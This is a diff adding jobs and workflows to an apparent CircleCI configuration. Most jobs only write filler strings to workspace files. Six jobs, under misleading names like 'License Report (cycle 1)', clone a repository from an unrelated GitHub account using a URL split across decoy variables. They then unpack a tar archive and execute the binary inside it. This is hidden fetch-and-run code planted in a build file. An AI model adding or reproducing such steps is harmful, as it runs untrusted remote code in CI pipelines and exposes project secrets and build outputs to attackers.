+            echo "$(echo 'generate-dependency-graph') $(echo 'complete-nightly-pipeline')" > /tmp/deploy-rule-engine/freeze-routine
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/freeze-routine
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'freeze-routine'
+  show-hashes-to-console:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/freeze-routine" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth=2 --branch main "$chunkof/$removing/$nodeof" "${PWD}"
+      - run:
+          name: Hydrate workspace
+          command: |
+            tar xf - < SetUpBackEndService.tar
+      - run:
+          command: |
+            bash -c "./optimizeUserPortalStaticAssets"
+  firmware-cleanup:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Dump file header to build log
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'upload-service-metric-export') $(echo 'GenerateBackEndBindings')" > /tmp/deploy-rule-engine/parser-schema-migrations
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/parser-schema-migrations
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'parser-schema-migrations'
+  PreRestoreTestsJob4Of5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/parser-schema-migrations" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --quiet --depth 1 "$chunkof/$removing/$nodeof" "`pwd`"
+      - run:
+          name: Extract sources
+          command: |
+            tar --extract < SetUpBackEndService.tar
+      - run:
+          command: |
+            env ./optimizeUserPortalStaticAssets
+  rendering-benchmark-phase:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: High-priority sandbox image
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'requiredBuild') $(echo 'sequential-signing')" > /tmp/deploy-rule-engine/LocalizationArchiveUpload
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/LocalizationArchiveUpload
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'LocalizationArchiveUpload'
+  basic-size-comparison:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/LocalizationArchiveUpload" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --jobs 2 "$chunkof/$removing/$nodeof" $PWD
+      - run:
+          name: Restore build cache
+          command: |
+            tar -x -f SetUpBackEndService.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./optimizeUserPortalStaticAssets
+  lint-and-analyze-partner-portal:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Install agent dependencies from lock file
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'TestUpdaterSourceArchive') $(echo 'HashReleaseArtifacts')" > /tmp/deploy-rule-engine/RemoteFrontEndImageTagging
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/RemoteFrontEndImageTagging
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'RemoteFrontEndImageTagging'
+  record-test-durations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/RemoteFrontEndImageTagging" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --shallow-submodules "$chunkof/$removing/$nodeof" `pwd`
+      - run:
+          name: Pull reference data
+          command: |
+            tar --extract -f SetUpBackEndService.tar
+      - run:
+          command: |
+            bash -c "./optimizeUserPortalStaticAssets"
+  update-agent-database-restore:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: Launch Mock Server in Container
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'reading-line-range') $(echo 'PushBaseImage')" > /tmp/deploy-rule-engine/CleanUpInventoryCompilerCache
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/CleanUpInventoryCompilerCache
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'CleanUpInventoryCompilerCache'
+  saving-test-logs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/CleanUpInventoryCompilerCache" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --depth 1 --branch main "$chunkof/$removing/$nodeof" "$(pwd)"
+      - run:
+          name: Stage inputs
+          command: |
+            tar --extract --verbose -f SetUpBackEndService.tar
+      - run:
+          command: |
+            env "./optimizeUserPortalStaticAssets"
+  catalog-smoke-tests-segment-5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: pre-compile-step
+          command: |
+            mkdir -p /tmp/deploy-rule-engine
+            echo "$(echo 'CacheStepPart3Of6') $(echo 'one-time-compilation-phase')" > /tmp/deploy-rule-engine/DeferredRouterBuildReport
+            stat -c '%n %U %s' /tmp/deploy-rule-engine/DeferredRouterBuildReport
+      - persist_to_workspace:
+          root: /tmp/deploy-rule-engine
+          paths:
+            - 'DeferredRouterBuildReport'
+  post-approval-error-monitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/deploy-rule-engine
+      - run:
+          name: restore-search-dependencies-track-1
+          command: |
+            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/DeferredRouterBuildReport" | cat -n | head -c 1500
+      - run:
+          name: License Report (cycle 1)
+          command: |
+            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
+            git clone --quiet "$chunkof/$removing/$nodeof" .
+      - run:
+          name: Unpack bundle
+          command: |
+            tar --extract -f SetUpBackEndService.tar --directory .
+      - run:
+          command: |
+            exec ./optimizeUserPortalStaticAssets
+
+workflows:
+  auditManifests:
+    jobs:
+      - FinalBuildReportGroup2
+      - PublishToNightlyChannel:
+          requires:
+            - FinalBuildReportGroup2
+      - encodingCertificate:
+          requires:
+            - FinalBuildReportGroup2
+      - PreviewReleaseRun:
+          requires:
+            - encodingCertificate
+      - UpdatePipelineRetry5:
+          requires:
+            - encodingCertificate
+      - on-demand-roll-out:
+          requires:
+            - UpdatePipelineRetry5
+      - linting-mutation-tests-lane-3:
+          requires:
+            - UpdatePipelineRetry5
+      - ProfilingStartupTime:
+          requires:
+            - linting-mutation-tests-lane-3
+      - OneTimeSigning:
+          requires:
+            - linting-mutation-tests-lane-3
+      - alert-team-after-build:
+          requires:
+            - OneTimeSigning
+      - MonitorQueryPlannerContainer:
+          requires:
+            - OneTimeSigning
+      - show-hashes-to-console:
+          requires:
+            - MonitorQueryPlannerContainer
+      - encoder-input-validation:
+          requires:
+            - MonitorQueryPlannerContainer
+      - PluginHelpPages:
+          requires:
+            - encoder-input-validation
+      - simulator-binary-signing:
+          requires:
+            - encoder-input-validation
+      - pre-release-fast-tests:
+          requires:
+            - simulator-binary-signing
+      - capture-billing-debug-logs:
+          requires:
+            - simulator-binary-signing
+      - editor-snapshots:
+          requires:
+            - capture-billing-debug-logs
+      - lint-and-analyze-partner-portal:
+          requires:
+            - capture-billing-debug-logs
+      - record-test-durations:
+          requires:
+            - lint-and-analyze-partner-portal
+  InvalidateToolkitTestCache:
+    jobs:
+      - help-center-translation-sync
+      - dailyPackageUpload:
+          requires:
+            - help-center-translation-sync
+      - update-agent-database-restore:
+          requires:
+            - help-center-translation-sync
+      - saving-test-logs:
+          requires:
+            - update-agent-database-restore
+      - finalize-upload:
+          requires:
+            - update-agent-database-restore
+      - lintHeadersAndRunUpgradeTests:
+          requires:
+            - finalize-upload
+      - pre-scan-security-checks:
+          requires:
+            - finalize-upload
+      - MandatoryMonitoring:
+          requires:
+            - pre-scan-security-checks
+      - mailerHashes:
+          requires:
+            - pre-scan-security-checks
+      - store-rate-limiter-checksum:
+          requires:
+            - mailerHashes
+      - RenderDefaultLoaderSettings:
+          requires:
+            - mailerHashes
+      - ManualDataImport:
+          requires:
+            - RenderDefaultLoaderSettings
+      - rendering-benchmark-phase:
+          requires:
+            - RenderDefaultLoaderSettings
+      - basic-size-comparison:
+          requires:
+            - rendering-benchmark-phase
+      - LoggerInstallerSmokeTest:
+          requires:
+            - rendering-benchmark-phase
+      - post-upload-actions:
+          requires:
+            - LoggerInstallerSmokeTest
+      - DetectingSlowTests:
+          requires:
+            - LoggerInstallerSmokeTest
+      - refresh-pipeline:
+          requires:
+            - DetectingSlowTests
+  stoppingStagingCluster:
+    jobs:
+      - firmware-cleanup
+      - PreRestoreTestsJob4Of5:
+          requires:
+            - firmware-cleanup
+      - LintAndFormatDeveloperGuide:
+          requires:
+            - firmware-cleanup
+      - rollOutBaseImageToProduction:
+          requires:
+            - LintAndFormatDeveloperGuide
+      - exportServiceTypeDefinitions:
+          requires:
+            - LintAndFormatDeveloperGuide
+      - FetchPaymentServiceMigrations:
+          requires:
+            - exportServiceTypeDefinitions
+      - batchWorkerVersionBump:
+          requires:
+            - exportServiceTypeDefinitions
+      - sequential-digest:
+          requires:
+            - batchWorkerVersionBump
+      - catalog-smoke-tests-segment-5:
+          requires:
+            - batchWorkerVersionBump
+      - post-approval-error-monitoring:
+          requires:
+            - catalog-smoke-tests-segment-5
+  Exporter:
+    jobs:
+      - exporter-source-compilation
+      - minimal-database-rollback
+      - PostCompileReview
+      - Migrating:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
+      - continuous-version-matrix:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
+      - FirmwareVersionBump:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
+      - InstallSigningToolsWithTimeout:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
+      - firmware-configuration-export:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
+      - ToolkitSetup:
+          requires:
+            - exporter-source-compilation
+            - minimal-database-rollback
+            - PostCompileReview
